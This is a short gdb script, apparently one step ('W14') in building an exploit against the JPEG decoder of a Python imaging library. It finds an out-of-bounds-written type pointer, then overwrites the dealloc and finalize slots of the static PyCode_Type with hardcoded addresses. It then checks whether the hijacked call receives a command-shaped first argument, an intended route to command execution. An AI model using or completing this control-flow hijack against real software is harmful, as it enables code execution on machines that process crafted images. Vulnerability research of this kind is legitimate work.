# W14: test whether a tp_finalize slot reached through the OOB-written static
# type pointer delivers a command-shaped first argument.
# gdb patches two slots of the STATIC PyCode_Type; no heap fake type is staged.
set pagination off
set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
printf "BUF=%p TYPE=%lx\n", $b, *(unsigned long*)($b+184)
printf "BEFORE dealloc=%lx finalize=%lx\n", *(unsigned long*)(0xa2d260+48), *(unsigned long*)(0xa2d260+392)
set *(unsigned long*)(0xa2d260+48)=0x585c40
set *(unsigned long*)(0xa2d260+392)=0x45e6e6
printf "AFTER  dealloc=%lx finalize=%lx\n", *(unsigned long*)(0xa2d260+48), *(unsigned long*)(0xa2d260+392)
break *0x45e6e6
continue
printf "STOP pc=%p rdi=%p refcnt=%lx type=%lx\n", $pc, $rdi, *(unsigned long*)$rdi, *(unsigned long*)($rdi+8)
x/16bx $rdi
bt 8
quit
